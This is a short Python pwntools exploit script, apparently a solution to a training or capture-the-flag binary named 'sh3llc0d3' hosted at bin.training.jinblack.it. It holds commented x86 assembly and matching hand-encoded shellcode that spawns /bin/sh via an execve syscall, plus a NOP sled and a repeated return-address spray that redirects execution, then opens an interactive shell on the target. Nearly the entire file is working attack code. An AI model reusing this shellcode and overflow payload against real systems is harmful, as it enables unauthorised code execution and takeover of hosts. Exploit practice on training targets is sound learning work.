# coding=UTF-8
from pwn import *

'''
mov ebx, 0x804c060
xor eax, eax
mov [0x804c067], al
push eax
mov ecx, eax
mov edx, eax
mov esi, 0xbffffff
sub esi, 0xbfffff4
mov eax, esi
int 0x80
'''

ELF('./sh3llc0d3')
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) == 2 and sys.argv[1] == 'attack':
    r = remote('bin.training.jinblack.it', 2002)
else:
    r = process('./sh3llc0d3')
    gdb.attach(r, '''
        #b *0x004011bb
    ''')


where_to_jump = p32(0x804c060+8)
shellcode = b"\xBB\x60\xC0\x04\x08\x31\xC0\xA2\x67\xC0\x04\x08\x50\x89\xC1\x89\xC2\xBE\xFF\xFF\xFF\x0B\x81\xEE\xF4\xFF\xFF\x0B\x89\xF0\xCD\x80"
nop_sled = b"\x90"


r.recvline()
input('press a key...')
exploit = b"/bin/shA" + shellcode + nop_sled*4 + where_to_jump*1000
r.sendline(exploit)
r.recvline()
r.interactive()

